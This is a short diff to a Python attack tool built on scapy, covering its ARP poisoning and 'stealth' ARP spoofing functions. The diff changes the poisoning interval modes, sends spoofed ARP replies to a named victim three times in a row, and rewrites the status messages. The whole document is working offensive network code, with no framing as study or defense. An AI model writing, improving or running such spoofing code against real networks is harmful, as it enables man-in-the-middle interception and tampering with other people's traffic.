@@ -57,8 +57,8 @@ def start_arp_poison(cmd):
             mode = args[i + 1]
             if mode == "aggresive":
                 interval = 1
-            elif mode == "silent":
-                interval = 10
+            elif mode == "persistant":
+                interval = 60
     if not target_ip or not spoofed_ip:
         print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
         return
@@ -104,10 +104,12 @@ def stealth_arp_spoof(cmd):
         if packet.haslayer(sc.ARP):
             arp = packet[sc.ARP]
             if arp.op == 1 and arp.psrc == target_ip and arp.pdst == spoofed_ip:
-                print(f"[+] Victim {target_ip} requested {spoofed_ip}. Sending spoofed reply.")
-                reply = sc.ARP(op=2, pdst=target_ip, hwdst=arp.hwsrc, psrc=spoofed_ip)
-                sc.send(reply, verbose=False)
+                print("[+] Victim %s requested %s. Sending spoofed reply." % (target_ip, spoofed_ip))
+                reply = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
+                for _ in range(3):
+                    sc.send(reply, verbose=False)
+                    time.sleep(0.05)
 
     iface = interface or sc.conf.iface
-    print(f"[!] Listening on interface '{iface}' for ARP requests from {target_ip} about {spoofed_ip}...")
+    print("[!] Listening on interface %s for ARP requests from %s about %s..." % (iface, target_ip, spoofed_ip))
     sc.sniff(filter="arp", prn=arp_sniffer, store=False, iface=iface)
